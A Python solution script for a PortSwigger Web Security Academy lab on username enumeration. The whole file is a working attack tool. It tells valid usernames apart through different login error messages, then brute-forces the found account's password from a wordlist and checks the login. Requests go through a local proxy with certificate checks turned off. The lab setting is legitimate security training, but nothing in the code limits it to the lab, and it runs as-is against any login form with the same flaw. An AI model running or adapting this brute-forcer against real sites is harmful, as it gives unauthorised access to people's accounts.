#!/usr/bin/env python3
# Lab: Username enumeration via different responses
# Lab-Link: <https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses>
# Difficulty: APPRENTICE
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def login(url, username, password):
    """Atempt to login.
    Return values:
      False On any condition not mentioned below
      1 if response contains string 'Invalid username' 
      2 if response contains string 'Incorrect password'
      3 if response is a redirect
    """
    data = {'username': username, 'password': password}
    r = requests.post(url, data=data, allow_redirects=False, verify=False, proxies=proxies)

    if r.status_code == 302:
        return 3

    res = r.text
    if 'Invalid username' in res:
        return 1

    if 'Incorrect password' in res:
        return 2

    return False


def enumerate_username(url, username_filename):
    with open(username_filename, 'r') as infile:
        for line in infile:
            username = line.rstrip()
            if login(url, username, 'XXX') == 2:
                return username

    return False


def enumerate_password(url, username, passwords_filename):
    with open(passwords_filename, 'r') as infile:
        for line in infile:
            password = line.rstrip()
            if login(url, username, password) == 3:
                return password
    return False


def verify_login(url, username, password):
    data = {'username': username, 'password': password}
    r = requests.post(url, data=data, verify=False, proxies=proxies, allow_redirects=True)
    return f'Your username is: {username}' in r.text


def main():
    print('[+] Username enumeration via different responses')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    print(f'[ ] Brute force username and password')

    url = f'{host}/login'
    username = enumerate_username(f'{url}', '../candidate_usernames.txt')
    if not username:
        print(f'[-] Failed to enumerate username')
        sys.exit(-2)
    print(f'[+] Found username: {username}')

    password = enumerate_password(f'{url}', username, '../candidate_passwords.txt')
    if not password:
        print(f'[-] Failed to enumerate password')
        sys.exit(-3)
    print(f'[+] Found password: {password}')

    if not verify_login(url, username, password):
        print(f'[+] Login not successful')
        sys.exit(-4)
    print(f'[+] Login successful')
    print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
